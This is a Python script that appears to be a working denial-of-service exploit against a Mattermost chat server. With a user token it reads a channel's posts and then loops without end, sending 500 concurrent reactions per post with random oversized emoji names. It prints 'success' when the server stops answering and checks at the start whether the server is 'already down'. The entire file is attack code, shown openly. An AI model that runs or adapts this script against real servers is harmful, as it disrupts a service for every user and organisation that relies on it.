#!/usr/bin/env python3

import asyncio
import sys
from itertools import chain
from uuid import uuid4

import aiohttp
from requests import get

URL = "https://mattermost.example.invalid"
CHANNEL_ID = "example-channel-id"
TOKEN = "example-mmauthtoken"


async def get_self(session):
    async with session.get(URL + "/api/v4/users/me") as response:
        return await response.json()


async def get_posts(session, channel_id):
    async with session.get(URL + f"/api/v4/channels/{channel_id}/posts") as response:
        if not response.ok and response.status != 429:
            print("[+] success")
            sys.exit(0)
        posts = await response.json()
        return posts.get("posts", [])


async def react(session, post_id, user_id, emoji):
    async with session.post(
        URL + "/api/v4/reactions",
        json={"post_id": post_id, "user_id": user_id, "emoji_name": emoji},
    ) as response:
        if not response.ok and response.status != 429:
            print("[+] success")
            sys.exit(0)
        return response


async def main():
    r = get(URL + "/api/v4/system/ping", headers={"Content-Type": "application/json"})
    if not r.ok and r.status_code != 429:
        print(f"[-] {URL} is already down")
        sys.exit(0)

    async with aiohttp.ClientSession(
        headers={"Authorization": f"Bearer {TOKEN}"},
    ) as session:
        self_info = await get_self(session)
        self_id = self_info.get("id")
        count = 0
        posts = await get_posts(session, CHANNEL_ID)
        posts = list(posts.keys())

        while True:
            # react 500 times to every fetched post
            tasks = chain(
                *[
                    [
                        react(
                            session,
                            post,
                            self_id,
                            f"{uuid4()}{uuid4()}".replace("-", ""),
                        )
                        for _ in range(500)
                    ]
                    for post in posts
                ],
            )
            # asynchroniously gather those tasks
            reactions = await asyncio.gather(*tasks)
            count += len(reactions)
            print(f"[+] {count=}")


if __name__ == "__main__":
    asyncio.run(main())
